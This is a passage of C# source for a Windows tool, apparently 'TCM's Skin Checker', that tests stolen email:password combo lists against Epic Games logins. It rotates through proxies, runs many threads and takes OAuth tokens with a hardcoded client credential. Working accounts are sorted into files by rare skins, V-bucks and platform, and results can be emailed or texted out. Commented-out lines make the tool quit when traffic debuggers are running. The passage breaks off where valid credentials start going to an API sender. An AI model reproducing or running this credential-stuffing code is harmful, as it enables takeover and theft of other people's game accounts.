                CheckForSkins.Checked = true;
            }
            string SetCB3 = Settings.Default["SaveCB17"].ToString();
            if (SetCB3 == "")
            {
                CheckForAxes.Checked = true;
            }
            string SetCB4 = Settings.Default["SaveCB18"].ToString();
            if (SetCB4 == "")
            {
                CheckForBackBling.Checked = true;
            }
            string SetCB5 = Settings.Default["SaveCB19"].ToString();
            if (SetCB5 == "")
            {
                CheckForGliders.Checked = true;
            }
            string SetCB6 = Settings.Default["SaveCB20"].ToString();
            if (SetCB6 == "")
            {
                CheckForDances.Checked = true;
            }
            string SetCB7 = Settings.Default["SaveCB21"].ToString();
            if (SetCB7 == "")
            {
                CheckForEmojis.Checked = true;
            }
            string SetCB8 = Settings.Default["SaveCB22"].ToString();
            if (SetCB8 == "")
            {
                CheckForLoadingScreens.Checked = true;
            }
            string SetCB9 = Settings.Default["SaveCB23"].ToString();
            if (SetCB9 == "")
            {
                DisableNotify.Checked = false;
            }
            string SetCB10 = Settings.Default["SaveCB24"].ToString();
            if (SetCB10 == "")
            {
                DisableSounds.Checked = false;
            }
            string SetCB11 = Settings.Default["SaveCB25"].ToString();
            if (SetCB11 == "")
            {
                PCSaveFile.Checked = false;
            }
            string SetCB12 = Settings.Default["SaveCB26"].ToString();
            if (SetCB12 == "")
            {
                PS4SaveFile.Checked = false;
            }
            string SetCB13 = Settings.Default["SaveCB27"].ToString();
            if (SetCB13 == "")
            {
                XboxSaveFile.Checked = false;
            }
            string SetCB14 = Settings.Default["SaveCB28"].ToString();
            if (SetCB14 == "")
            {
                NintendoSaveFile.Checked = false;
            }
            string SetCB15 = Settings.Default["SaveCB29"].ToString();
            if (SetCB15 == "")
            {
                CheckForOtherInformation.Checked = true;
            }
            string SetCB16 = Settings.Default["SaveCB30"].ToString();
            if (SetCB16 == "")
            {
                CheckForBattlePassInformation.Checked = true;
            }
            string SetCB17 = Settings.Default["SaveCB31"].ToString();
            if (SetCB17 == "")
            {
                CheckForPastSeasonInformation.Checked = true;
            }
            string SetCB18 = Settings.Default["SaveCB32"].ToString();
            if (SetCB18 == "")
            {
                CeckForLast5Purchases.Checked = true;
            }
            string SetCB19 = Settings.Default["SaveCB33"].ToString();
            if (SetCB19 == "")
            {
                CheckForTotalItemCount.Checked = true;
            }
            string SetCB20 = Settings.Default["SaveCB34"].ToString();
            if (SetCB20 == "")
            {
                StackedSkinSaver.Checked = true;
            }
            string SetCB21 = Settings.Default["SaveCB35"].ToString();
            if (SetCB21 == "")
            {
                APISender.Checked = false;
            }
            string SetCB22 = Settings.Default["SaveCB36"].ToString();
            if (SetCB22 == "")
            {
                RoyaleBomberSaveFile.Checked = false;
            }
            string SetCB23 = Settings.Default["SaveCB37"].ToString();
            if (SetCB23 == "")
            {
                CandyAxeSaveFile.Checked = false;
            }
            string SetCB24 = Settings.Default["SaveCB38"].ToString();
            if (SetCB24 == "")
            {
                RaidersRevengeSaveFile.Checked = false;
            }
            string SetCB25 = Settings.Default["SaveCB39"].ToString();
            if (SetCB25 == "")
            {
                PowerChordSaveFile.Checked = false;
            }
            string SetCB26 = Settings.Default["SaveCB40"].ToString();
            if (SetCB26 == "")
            {
                SgtGreenCloverSaveFile.Checked = false;
            }
            string SetCB27 = Settings.Default["SaveCB41"].ToString();
            if (SetCB27 == "")
            {
                RenegadeSaveFile.Checked = false;
            }
            string SetCB28 = Settings.Default["SaveCB42"].ToString();
            if (SetCB28 == "")
            {
                AerialAssaultTrooperSaveFile.Checked = false;
            }
            string SetCB29 = Settings.Default["SaveCB43"].ToString();
            if (SetCB29 == "")
            {
                SaveSTWTiersToFiles.Checked = false;
            }
            string SetCB30 = Settings.Default["SaveCB44"].ToString();
            if (SetCB30 == "")
            {
                RemoveWhenChecked.Checked = false;
            }
            string SetCB31 = Settings.Default["SaveCB45"].ToString();
            if (SetCB31 == "")
            {
                EnableRemoveBadProxies.Checked = false;
            }
            string SetCB32 = Settings.Default["SaveCB46"].ToString();
            if (SetCB32 == "")
            {
                RemoveProxiesWithErrors.Checked = false;
            }
            string SetCB33 = Settings.Default["SaveCB47"].ToString();
            if (SetCB33 == "")
            {
                CheckAccountInfo.Checked = true;
            }
            string SetCB34 = Settings.Default["SaveCB48"].ToString();
            if (SetCB34 == "")
            {
                EnableNotifyEmail.Checked = false;
            }
            string SetCB35 = Settings.Default["SaveCB49"].ToString();
            if (SetCB35 == "")
            {
                IfStackedChecked.Checked = false;
            }
            string SetCB36 = Settings.Default["SaveCB50"].ToString();
            if (SetCB36 == "")
            {
                EmailSentTXT.Checked = false;
            }
            string SetCB37 = Settings.Default["SaveCB51"].ToString();
            if (SetCB37 == "")
            {
                EmailSendHTML.Checked = false;
            }
            string SetCB38 = Settings.Default["SaveCB52"].ToString();
            if (SetCB38 == "")
            {
                FinalFileHasTextFile.Checked = false;
            }
            string SetCB39 = Settings.Default["SaveCB53"].ToString();
            if (SetCB39 == "")
            {
                SendFinalEmailOnly.Checked = false;
            }
            string SetCB40 = Settings.Default["SaveCB54"].ToString();
            if (SetCB40 == "")
            {
                EnableTextNowNotify.Checked = false;
            }
        }

        private void btnCombo_Click(object sender, EventArgs e)
        {
            //if ((uint)Process.GetProcessesByName("Fiddler").Length > 0U)
            //Environment.Exit(0);
            //if ((uint)Process.GetProcessesByName("HTTPDebugger").Length > 0U)
            //nvironment.Exit(0);
            //if ((uint)Process.GetProcessesByName("Charles").Length > 0U)
            //Environment.Exit(0);
            Combo.Clear();
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.RestoreDirectory = true;
            openFileDialog.Multiselect = false;
            openFileDialog.Filter = "Text Files (*.txt)|*.txt";
            openFileDialog.FilterIndex = 1;
            int num = (int)openFileDialog.ShowDialog();
            try
            {
                myFile = openFileDialog.FileName;
                using (StreamReader streamReader = new StreamReader(myFile))
                {
                    while (streamReader.Peek() != -1)
                        Combo.Add(streamReader.ReadLine());
                }
                btnCombo.Text = string.Format("Combo List ({0})", Combo.Count);
                btnProxy.Text = string.Format("Proxy List ({0})", Proxies.Count);
                fileName = Path.GetFileNameWithoutExtension(openFileDialog.FileName);
            }
            catch
            {
                return;
            }
            string formattype = "{0:#,###,###.##}";
            string CombosLoaded = string.Format(formattype, Combo.Count);
            string MessageToShow = CombosLoaded + " Combos Successfully Loaded!";
            MessageBox.Show(MessageToShow);
        }

        private void btnProxy_Click(object sender, EventArgs e)
        {
            //if ((uint)Process.GetProcessesByName("Fiddler").Length > 0U)
            //Environment.Exit(0);
            //if ((uint)Process.GetProcessesByName("HTTPDebugger").Length > 0U)
            //Environment.Exit(0);
            //if ((uint)Process.GetProcessesByName("Charles").Length > 0U)
            //Environment.Exit(0);
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Title = "Load Proxy List";
            openFileDialog.DefaultExt = "txt";
            openFileDialog.Filter = "Text files|*.txt";
            openFileDialog.RestoreDirectory = true;
            if (openFileDialog.ShowDialog() != DialogResult.OK)
                return;
            try
            {
                string str = null;
                using (StreamReader streamReader = new StreamReader(new FileStream(openFileDialog.FileName, FileMode.Open, FileAccess.Read), Encoding.UTF8))
                    str = streamReader.ReadToEnd();
                if (string.IsNullOrEmpty(str))
                    return;
                Proxies.Clear();
                Proxies.AddRange(str.Split(Convert.ToChar('\n')));
                Proxies = RemoveDuplicatesIterative(Proxies);
                btnCombo.Text = string.Format("Combo List ({0})", Combo.Count);
                btnProxy.Text = string.Format("Proxy List ({0})", Proxies.Count);
            }
            catch (Exception ex)
            {

            }
            string formattype = "{0:#,###,###.##}";
            string ProxiesLoaded = string.Format(formattype, Proxies.Count);
            string MessageToShow = ProxiesLoaded + " Proxies Successfully Loaded!";
            MessageBox.Show(MessageToShow);
        }

        public static WebClient webClient = new WebClient();

        [VirtualizeCode]
        public static void UpdateOrNuh()
        {
            if (Version != new WebClient().DownloadString("http://tcmtools.com/CheckerStuff/FortniteTool/VersionNumber.txt"))
            {
                MessageBox.Show("Tool Update Found!, Click Ok To Go To Download!");
                Process.Start("https://www.tcmtools.com/community/index.php?resources/");
                Process.GetCurrentProcess().Kill();
            }
        }

        WebClient wc2 = new WebClientWithTimeout2();


        public class WebClientWithTimeout2 : WebClient
        {
            protected override WebRequest GetWebRequest(Uri address)
            {
                WebRequest wr = base.GetWebRequest(address);
                wr.Timeout = 10000; // timeout in milliseconds (ms)
                return wr;
            }
        }


        private void btnStart_Click(object sender, EventArgs e)
        {
            if(EnableRemoveBadProxies.Checked || RemoveProxiesWithErrors.Checked)
            {
                DialogResult dialogResult = MessageBox.Show("You Have Remove Bad Proxies Or remove Proxies With Errors Enabled\nThis May Cause Crashing With Higher Threads\nWould You Like To Disable Them ? ", "READ, MAY CRASH WITH SETTINGS ENABLED", MessageBoxButtons.YesNo);
                if (dialogResult == DialogResult.Yes)
                {
                    EnableRemoveBadProxies.Checked = false;
                    RemoveProxiesWithErrors.Checked = false;
                }
            }
            bunifuTransition1.AnimationType = BunifuAnimatorNS.AnimationType.Mosaic;
            bunifuTransition1.HideSync(btnStart);
            bunifuTransition1.ShowSync(btnStop);
            if (Combo.Count <= 0)
            {
                MessageBox.Show("ERROR, Please choose combos");
            }
            if (Combo.Count > 0)
            {
                btnCombo.Text = string.Format("Combo List ({0})", Combo.Count.ToString());
                btnProxy.Text = string.Format("Proxy List ({0})", Proxies.Count.ToString());
                if (ListBoxDisableText.Checked)
                {
                    FnBattleRoyalLB.Visible = false;
                    FnBattleRoyalLB.Enabled = false;
                }
                bunifuCircleProgressbar1.Value = 0;
                bunifuCircleProgressbar1.MaxValue = Combo.Count;
                Thread threadingstuff = new Thread(startthreading);
                CheckForIllegalCrossThreadCalls = false;
                threadingstuff.Start();
                try
                {
                    timer1.Interval = (1000) * (1);
                    timer1.Enabled = true;
                    timer1.Start();
                    startTime = DateTime.Now;
                }
                catch
                {
                    MessageBox.Show("An Error Has Occured, Please Message TrynCatchMeh On Instagram with error code: 65896");
                }
            }
        }

        private void speech(string args) // defining the function which will accept a string parameter
        {
            SpeechSynthesizer synthesizer = new SpeechSynthesizer();
            synthesizer.SelectVoiceByHints(VoiceGender.Female, VoiceAge.Teen); // to change VoiceGender and VoiceAge check out those links below
            synthesizer.Volume = 75;  // (0 - 100)
            synthesizer.Rate = 0;     // (-10 - 10)
            synthesizer.Speak(args); // here args = pran
        }

        private void startthreading()
        {
            if (!Directory.Exists(string.Format("{0}\\Results", Application.StartupPath)))
            {
                Directory.CreateDirectory(string.Format("{0}\\Results", Application.StartupPath));
            }
            textfile = Path.Combine(folder, string.Format("Skins Checked By TCM's Skin Checker.txt", fileName));
            validaccounts = Path.Combine(folder, string.Format("Valid Accounts Checked By TCM's Skin Checker.txt", fileName));
            badaccounts = Path.Combine(folder, string.Format("Bad Checked By TCM's Skin Checker.txt", fileName));
            TWOFAaccounts = Path.Combine(folder, string.Format("TwoStep Accounts Checked By TCM's Skin Checker.txt", fileName));
            BlackKnight = Path.Combine(folder, string.Format("Black Knight Accounts Checked By TCM's Skin Checker.txt", fileName));
            CodenameELF = Path.Combine(folder, string.Format("odename ELF Accounts Checked By TCM's Skin Checker.txt", fileName));
            Crackshot = Path.Combine(folder, string.Format("Crackshot Accounts Checked By TCM's Skin Checker.txt", fileName));
            GhoulTrooper = Path.Combine(folder, string.Format("Ghoul Trooper Accounts Checked By TCM's Skin Checker.txt", fileName));
            MerryMarauder = Path.Combine(folder, string.Format("Merry Marauder Accounts Checked By TCM's Skin Checker.txt", fileName));
            NogOps = Path.Combine(folder, string.Format("Nog Ops Accounts Checked By TCM's Skin Checker.txt", fileName));
            RedNosedRaider = Path.Combine(folder, string.Format("Red Nosed Raider Accounts Checked By TCM's Skin Checker.txt", fileName));
            OGSkullTrooper = Path.Combine(folder, string.Format("OG Skull Trooper Accounts Checked By TCM's Skin Checker.txt", fileName));
            NoneOGSkullTrooper = Path.Combine(folder, string.Format("None OG Skull Trooper Accounts Checked By TCM's Skin Checker.txt", fileName));
            Scythe = Path.Combine(folder, string.Format("Scythe Accounts Checked By TCM's Skin Checker.txt", fileName));
            SaveTheWorld = Path.Combine(folder, string.Format("Save The World Accounts Checked By TCM's Skin Checker.txt", fileName));
            Savevbucks = Path.Combine(folder, string.Format("Vbucks Accounts Checked By TCM's Skin Checker.txt", fileName));
            SavePCPlatform = Path.Combine(folder, string.Format("PC Accounts Checked By TCM's Skin Checker.txt", fileName));
            SavePS4Platform = Path.Combine(folder, string.Format("PS4 Accounts Checked By TCM's Skin Checker.txt", fileName));
            SaveXboxPlatform = Path.Combine(folder, string.Format("Xbox Accounts Checked By TCM's Skin Checker.txt", fileName));
            SaveNintendoPlatform = Path.Combine(folder, string.Format("Nintendo Accounts Checked By TCM's Skin Checker.txt", fileName));
            StackedAccounts = Path.Combine(folder, string.Format("Stacked Accounts Found By TCM's Skin Checker.txt", fileName));
            Royalebomber = Path.Combine(folder, string.Format("Royalebomber Found By TCM's Skin Checker.txt", fileName));
            Candyaxe = Path.Combine(folder, string.Format("Candyaxe Found By TCM's Skin Checker.txt", fileName));
            RenegadeSkin = Path.Combine(folder, string.Format("Renegade Found By TCM's Skin Checker.txt", fileName));
            AerialAssaultTrooper = Path.Combine(folder, string.Format("Aerial Assault Trooper Found By TCM's Skin Checker.txt", fileName));
            Raidersrevenge = Path.Combine(folder, string.Format("Raiders Revenge Found By TCM's Skin Checker.txt", fileName));
            PowerChord = Path.Combine(folder, string.Format("Power Chord Found By TCM's Skin Checker.txt", fileName));
            SgtGreenClover = Path.Combine(folder, string.Format("SGT. Green Clover Found By TCM's Skin Checker.txt", fileName));
            GGSave = Path.Combine(folder, string.Format("Ginger Gunner Found By TCM's Skin Checker.txt", fileName));

            STWStandard = Path.Combine(folder, string.Format("STW Standard Edition Found By TCM's Skin Checker.txt", fileName));
            STWDelux = Path.Combine(folder, string.Format("STW Delux Edition Found By TCM's Skin Checker.txt", fileName));
            STWSDelux = Path.Combine(folder, string.Format("STW Super Delux Edition Found By TCM's Skin Checker.txt", fileName));
            STWLimited = Path.Combine(folder, string.Format("STW Limited Edition Found By TCM's Skin Checker.txt", fileName));
            STWUltimate = Path.Combine(folder, string.Format("STW Ultimate Edition Found By TCM's Skin Checker.txt", fileName));


            GalaxySkinFound = Path.Combine(folder, string.Format("Galaxy Skins Found By TCM's Skin Checker.txt", fileName));


            if (btnStart.InvokeRequired)
            {
                btnStart.Invoke((MethodInvoker)(() => { btnStart.Enabled = false; }));
            }
            _Run = false;
            if (!IfPaauseTheList.Checked)
            {
                index = 0;
                validcnt = 0;
                invalidcnt = 0;
                errorcnt = 0;
                checkedcnt = 0;
                retrycnt = 0;
                rareskins = 0;
                STW = 0;
                Skully = 0;
                RenegadeCount = 0;
                VbucksFound = 0;
                TotalSkinsChecked = 0;
                TotalGlidersChecked = 0;
                StandardSTW = 0;
                OGSkullCount = 0;
                NoobySkullTrooperAccounts = 0;
                DeluxEditionSTW = 0;
                SuperDeluxSTW = 0;
                LimitedEditionSTWE = 0;
                UltimateEditionSTWE = 0;
                TotalGalaxyChecked = 0;
                TotalMoneyzSpent = 0;
                lockedCuz2Fa = 0;
                BadProxies = 0;
                GoodProxies = 0;
                DeadProxies = 0;
            }
            _Run = true;
            if (cmbProxyType.InvokeRequired)
            {
                cmbProxyType.Invoke((MethodInvoker)(() => { SetEnum(cmbProxyType.SelectedIndex); }));
            }
            mainMethod();
        }

        private void SetEnum(int choice)
        {
            if (choice == 0)
                PType = ProxyType.Http;
            else if (choice == 1)
            {
                PType = ProxyType.Socks4;
            }
            else
            {
                if (choice != 2)
                    return;
                PType = ProxyType.Socks5;
            }
        }

        public class WebClientWithTimeout : WebClient
        {
            protected override WebRequest GetWebRequest(Uri address)
            {
                WebRequest wr = base.GetWebRequest(address);
                wr.Timeout = 1000; // timeout in milliseconds (ms)
                return wr;
            }
        }

        public static bool IsWithin(int value, int minimum, int maximum)
        {
            return value >= minimum && value <= maximum;
        }

        private void UpdateProxyStats()
        {
            try
            {
                base.Invoke(new MethodInvoker(delegate
                {
                    string formattype = "{0:#,###,###.##}";
                    ValidProxiesChecked.Text = string.Format(formattype, GoodProxies);
                    BannedProxiesChecked.Text = string.Format(formattype, BadProxies);
                    DeadAssProxies.Text = string.Format(formattype, DeadProxies);
                    BannedCheckerTotalLeftToCheck.Text = string.Format(formattype, Proxies.Count());
                    int number = Process.GetCurrentProcess().Threads.Count;
                    BannedProxyCheckThreadsRunning.Text = string.Format(formattype, number);
                    ValidProxyListCount.Text = ValidProxyListTextBox.Lines.Length.ToString();
                    InvalidProxiesListCount.Text = InvalidProxyListTextBox.Lines.Length.ToString();
                    var percent = (double)ValidProxyListTextBox.Lines.Length / (double)InvalidProxyListTextBox.Lines.Length;
                    if (ShowBannedProxies.Checked && ShowValidProxies.Checked)
                    {
                        string PercentString = percent.ToString();
                        int trimLength = 4;
                        if (PercentString.Length > trimLength) PercentString = PercentString.Remove(trimLength);
                        BannedCheckerThreadsToRunRatio.Text = PercentString.Replace(".", string.Empty) + "%";
                    }
                    else
                    {
                        BannedCheckerThreadsToRunRatio.Text = "N/A";
                    }
                }));
            }
            catch (Exception)
            {
                MessageBox.Show("ERROR");
            }
        }

        public void mainMethod()
        {
            isDone = false;
            int ThreadCount = (int)TotalNumberOfThreads.Value;
            int SleepTimer = (int)ThreadSleepTime.Value;
            if (cmbProxyType.InvokeRequired)
            {
                cmbProxyType.Invoke((MethodInvoker)(() =>
                {
                    if (cmbProxyType.SelectedIndex == 3)
                        Threadscount = ThreadCount;
                    else
                        Threadscount = ThreadCount;
                }));
            }


            ThreadSleepCount = 100;

            for (int i = 0; i < Threadscount; i++)
            {
                Thread thread = new Thread(new ThreadStart(DoWork));
                thread.IsBackground = true;
                tList.Add(thread);
                thread.Start();
            }
            new Thread(() =>
            {
                while (!isCompleted())
                {
                    updatestatus();
                    Thread.Sleep(SleepTimer);
                }
                isDone = true;
                base.Invoke(new Action(delegate
                {
                    _Run = false;
                    updatestatus();
                    try
                    {
                        if (EnableNotifyEmail.Checked)
                        {
                            if (FinalFileHasTextFile.Checked)
                            {
                                if (FastCheck.Checked)
                                {
                                    string BodyToSendEmail = "Hello " + Environment.UserName + "<br>We Just Wanted To Let You Know That All Accounts Have Been Checked<br>Here Is What Has Been Found!<br><br>Total Valid Accounts: " + lblValid.Text + "<br>Total Invalid Accounts: " + lblInvalid.Text + "<br>Total Errors That Occured: " + lblErrors.Text + "<br>Retries That Occured: " + lblRetries.Text + "<br>Checked Accounts: " + lblChecked.Text + "<br><br>Total Rare Skins Found: " + RareSkinsFound.Text + "<br>STW Accounts Found: " + STWAccounts.Text + "<br>Skull Trooper Accounts Found: " + SkullyAccounts.Text + "<br>Renegade Accounts Found: " + Renegade.Text + "<br>Total Vbucks Accross Accounts: " + TotalVbucks.Text + "<br>Total Skins Accross All Accounts: " + TotalSkinsAccrossAccounts.Text + "<br>Axes Accross Accounts:" + GlidersAccrossAccounts.Text + "<br>Galaxy Skins Found: " + GalaxySkinsFound.Text + "<br><br>This Check Took " + TotalTime.Text + " To Finish!";
                                    SendMessageWithTxt("mailer@fortnite.exposed", "TCM Fortnite Tool", "TCM Fortnite Tool Check Complete!", "", EmailToNotifyToo.Text, validaccounts, "Final Skins Checked By TCM Checker.txt", BodyToSendEmail);
                                }
                                else if (EmailSentTXT.Checked)
                                {
                                    string BodyToSendEmail = "Hello " + Environment.UserName + "<br>We Just Wanted To Let You Know That All Accounts Have Been Checked<br>Here Is What Has Been Found!<br><br>Total Valid Accounts: " + lblValid.Text + "<br>Total Invalid Accounts: " + lblInvalid.Text + "<br>Total Errors That Occured: " + lblErrors.Text + "<br>Retries That Occured: " + lblRetries.Text + "<br>Checked Accounts: " + lblChecked.Text + "<br><br>Total Rare Skins Found: " + RareSkinsFound.Text + "<br>STW Accounts Found: " + STWAccounts.Text + "<br>Skull Trooper Accounts Found: " + SkullyAccounts.Text + "<br>Renegade Accounts Found: " + Renegade.Text + "<br>Total Vbucks Accross Accounts: " + TotalVbucks.Text + "<br>Total Skins Accross All Accounts: " + TotalSkinsAccrossAccounts.Text + "<br>Axes Accross Accounts:" + GlidersAccrossAccounts.Text + "<br>Galaxy Skins Found: " + GalaxySkinsFound.Text + "<br><br>This Check Took " + TotalTime.Text + " To Finish!";
                                    SendMessageWithTxt("mailer@fortnite.exposed", "TCM Fortnite Tool", "TCM Fortnite Tool Check Complete!", "", EmailToNotifyToo.Text, textfile, "Final Skins Checked By TCM Checker.txt", BodyToSendEmail);
                                }
                                else if (EmailSendHTML.Checked)
                                {
                                    string MainHTMLToEdit = new WebClient().DownloadString("https://pastebin.com/raw/PtK3LqKM");
                                    string BodyToSendEmail = "Hello " + Environment.UserName + "<br>We Just Wanted To Let You Know That All Accounts Have Been Checked<br>Here Is What Has Been Found!<br><br>Total Valid Accounts: " + lblValid.Text + "<br>Total Invalid Accounts: " + lblInvalid.Text + "<br>Total Errors That Occured: " + lblErrors.Text + "<br>Retries That Occured: " + lblRetries.Text + "<br>Checked Accounts: " + lblChecked.Text + "<br><br>Total Rare Skins Found: " + RareSkinsFound.Text + "<br>STW Accounts Found: " + STWAccounts.Text + "<br>Skull Trooper Accounts Found: " + SkullyAccounts.Text + "<br>Renegade Accounts Found: " + Renegade.Text + "<br>Total Vbucks Accross Accounts: " + TotalVbucks.Text + "<br>Total Skins Accross All Accounts: " + TotalSkinsAccrossAccounts.Text + "<br>Axes Accross Accounts:" + GlidersAccrossAccounts.Text + "<br>Galaxy Skins Found: " + GalaxySkinsFound.Text + "<br><br>This Check Took " + TotalTime.Text + " To Finish!";
                                    string NotifyEmailFinishDone = MainHTMLToEdit.Replace("ACCOUNT INFORMATIOIN SHOWN HERE", BodyToSendEmail);
                                    string NotifyEmailFinishFinished = NotifyEmailFinishDone.Replace("TCM TOOL ACCOUNT FOUND!", "TCM Tool Check Finished!");
                                    SendMessageWithTxt("mailer@fortnite.exposed", "TCM Fortnite Tool", "TCM Fortnite Tool Check Complete!", "", EmailToNotifyToo.Text, textfile, "Final Skins Checked By TCM Checker.txt", NotifyEmailFinishFinished);
                                }
                                else
                                {
                                    EmailSentTXT.Checked = true;
                                }
                            }
                            else
                            {
                                if (EmailSentTXT.Checked)
                                {
                                    string BodyToSendEmail = "Hello " + Environment.UserName + "<br>We Just Wanted To Let You Know That All Accounts Have Been Checked<br>Here Is What Has Been Found!<br><br>Total Valid Accounts: " + lblValid.Text + "<br>Total Invalid Accounts: " + lblInvalid.Text + "<br>Total Errors That Occured: " + lblErrors.Text + "<br>Retries That Occured: " + lblRetries.Text + "<br>Checked Accounts: " + lblChecked.Text + "<br><br>Total Rare Skins Found: " + RareSkinsFound.Text + "<br>STW Accounts Found: " + STWAccounts.Text + "<br>Skull Trooper Accounts Found: " + SkullyAccounts.Text + "<br>Renegade Accounts Found: " + Renegade.Text + "<br>Total Vbucks Accross Accounts: " + TotalVbucks.Text + "<br>Total Skins Accross All Accounts: " + TotalSkinsAccrossAccounts.Text + "<br>Axes Accross Accounts:" + GlidersAccrossAccounts.Text + "<br>Galaxy Skins Found: " + GalaxySkinsFound.Text + "<br><br>This Check Took " + TotalTime.Text + " To Finish!";
                                    EmailSenderAPI("TCM Fortnite Tool Check Complete!", "mailer@fortnite.exposed", "TCM Fortnite Tool", EmailToNotifyToo.Text, BodyToSendEmail);
                                }
                                else if (EmailSendHTML.Checked)
                                {
                                    string MainHTMLToEdit = new WebClient().DownloadString("https://pastebin.com/raw/PtK3LqKM");
                                    string BodyToSendEmail = "Hello " + Environment.UserName + "<br>We Just Wanted To Let You Know That All Accounts Have Been Checked<br>Here Is What Has Been Found!<br><br>Total Valid Accounts: " + lblValid.Text + "<br>Total Invalid Accounts: " + lblInvalid.Text + "<br>Total Errors That Occured: " + lblErrors.Text + "<br>Retries That Occured: " + lblRetries.Text + "<br>Checked Accounts: " + lblChecked.Text + "<br><br>Total Rare Skins Found: " + RareSkinsFound.Text + "<br>STW Accounts Found: " + STWAccounts.Text + "<br>Skull Trooper Accounts Found: " + SkullyAccounts.Text + "<br>Renegade Accounts Found: " + Renegade.Text + "<br>Total Vbucks Accross Accounts: " + TotalVbucks.Text + "<br>Total Skins Accross All Accounts: " + TotalSkinsAccrossAccounts.Text + "<br>Axes Accross Accounts:" + GlidersAccrossAccounts.Text + "<br>Galaxy Skins Found: " + GalaxySkinsFound.Text + "<br><br>This Check Took " + TotalTime.Text + " To Finish!";
                                    string NotifyEmailFinishDone = MainHTMLToEdit.Replace("ACCOUNT INFORMATIOIN SHOWN HERE", BodyToSendEmail);
                                    string NotifyEmailFinishFinished = NotifyEmailFinishDone.Replace("TCM TOOL ACCOUNT FOUND!", "TCM Tool Check Finished!");
                                    EmailSenderAPI("TCM Fortnite Tool Check Complete!", "mailer@fortnite.exposed", "TCM Fortnite Tool", EmailToNotifyToo.Text, NotifyEmailFinishFinished);
                                }
                                else
                                {
                                    EmailSentTXT.Checked = true;
                                }
                            }
                        }
                    }
                    catch
                    {
                        MessageBox.Show("Oops Something Wen't Wrong Sending The Final Email Notification!");
                    }
                    if (EnableTextNowNotify.Checked)
                    {
                        try
                        {
                            string BodyToSendEmail = "Hello " + Environment.UserName + "\n\nWe Just Wanted To Let You Know That All Accounts Have Been Checked\nHere Is What Has Been Found!\n\nTotal Valid Accounts: " + lblValid.Text + "\nTotal Invalid Accounts: " + lblInvalid.Text + "\nTotal Errors That Occured: " + lblErrors.Text + "\nRetries That Occured: " + lblRetries.Text + "\nChecked Accounts: " + lblChecked.Text + "\n\nTotal Rare Skins Found: " + RareSkinsFound.Text + "\nSTW Accounts Found: " + STWAccounts.Text + "\nSkull Trooper Accounts Found: " + SkullyAccounts.Text + "\nRenegade Accounts Found: " + Renegade.Text + "\nTotal Vbucks Accross Accounts: " + TotalVbucks.Text + "\nTotal Skins Accross All Accounts: " + TotalSkinsAccrossAccounts.Text + "\nAxes Accross Accounts:" + GlidersAccrossAccounts.Text + "\nGalaxy Skins Found: " + GalaxySkinsFound.Text + "\n\nThis Check Took " + TotalTime.Text + " To Finish!";
                            SMSSenderAPI("TCM Tool Stacked Account Found!", "mailer@fortnite.exposed", "TCM Fortnite Tool", TextNowNotificationsText.Text + "@textnow.me", BodyToSendEmail + "\n\n\n");
                        }
                        catch
                        {

                        }
                    }
                    timer1.Stop();
                    if (!IfPaauseTheList.Checked)
                    {
                        MessageBox.Show("Brute / Checker has finished successfully.");
                    }
                    else if (IfPaauseTheList.Checked)
                    {
                        MessageBox.Show("Brute / Checker has been paused, Hit Start to start again!");
                    }
                    btnStart.Enabled = true;
                    btnStop.Enabled = true;
                    bunifuTransition1.ShowSync(btnStart);
                    bunifuTransition1.HideSync(btnStop);
                    updatestatus();
                }));
            })
            {
                IsBackground = true
            }.Start();
        }

        WebClient wc = new WebClientWithTimeout();
        private void DoWork()
        {
            string account = string.Empty;
            _IsGood = true;
            while (_Run)
            {
                lock (tLock)
                {
                    if (index < Combo.Count)
                    {
                        account = Combo.ElementAt<string>(index);
                        index = index + 1;
                    }
                    else
                        break;
                }
                string[] strArray = account.Split(new char[3]
                {
          ';',
          ':',
          '|'
                });
                if (account.Length >= 2)
                {
                    while (_IsGood)
                    {
                        if (_Run.Equals(false))
                            return;
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            try
                            {
                                httpRequest.ClearAllHeaders();
                                httpRequest.UserAgent = "EpicGamesLauncher/10.2.3-7092195+++Portal+Release-Live Windows/10.0.17134.1.768.64bit";
                                httpRequest.KeepAlive = true;
                                httpRequest.Cookies = new CookieDictionary(false);
                                httpRequest.IgnoreProtocolErrors = true;
                                httpRequest.AllowAutoRedirect = false;
                                int ProxyTimeoutTimer = (int)ProxyTimeout.Value;
                                httpRequest.ConnectTimeout = ProxyTimeoutTimer;                             
                                if (Proxies.Count == 0)
                                {
                                    httpRequest.Proxy = null;
                                }
                                else
                                {
                                    httpRequest.Proxy = GetPClient(Proxies.ElementAt<string>(rnd.Next(Proxies.Count)));
                                    httpRequest.Proxy.ConnectTimeout = ProxyTimeoutTimer;
                                }
                                string response = httpRequest.Get("https://www.epicgames.com/id/api/csrf").ToString();
                                var value = httpRequest.Cookies["XSRF-TOKEN"];
                                httpRequest.AddHeader("x-xsrf-token", value);
                                string SingleAccountInfo = string.Format("email={0}&password={1}&rememberMe=False", WebUtility.UrlEncode(strArray[0]), strArray[1]);
                                string SingleAccountOath = httpRequest.Post("https://www.epicgames.com/id/api/login", SingleAccountInfo, "application/x-www-form-urlencoded").ToString();
                                httpRequest.AddHeader("x-xsrf-token", value);
                                string GetOath1 = httpRequest.Get("https://www.epicgames.com/id/api/redirect").ToString();
                                httpRequest.AddHeader("x-xsrf-token", value);
                                string GetOath2 = httpRequest.Get("https://www.epicgames.com/id/api/exchange").ToString();
                                JToken AccessToken = JObject.Parse(GetOath2)["code"];
                                httpRequest.AddHeader("Authorization", "basic MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE=");
                                string OathThisShit = string.Format("grant_type=exchange_code&exchange_code=" + AccessToken + "&token_type=eg1");
                                string input = httpRequest.Post("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token", OathThisShit, "application/x-www-form-urlencoded").ToString();
                                if (input.Contains("access_token"))
                                {
                                    if (FastCheck.Checked)
                                    {
                                        using (StreamWriter vacc = File.AppendText(validaccounts))
                                        {
                                            vacc.WriteLine(account);
                                            FnBattleRoyalLB.Items.Add(account);
                                        }
                                        if (APISender.Checked)
                                        {
                                            try
                                            {
                                                string AccUser = string.Format("{0}", WebUtility.UrlEncode(strArray[0]), strArray[1]);
                                                string AccPass = string.Format("{1}", WebUtility.UrlEncode(strArray[0]), strArray[1]);
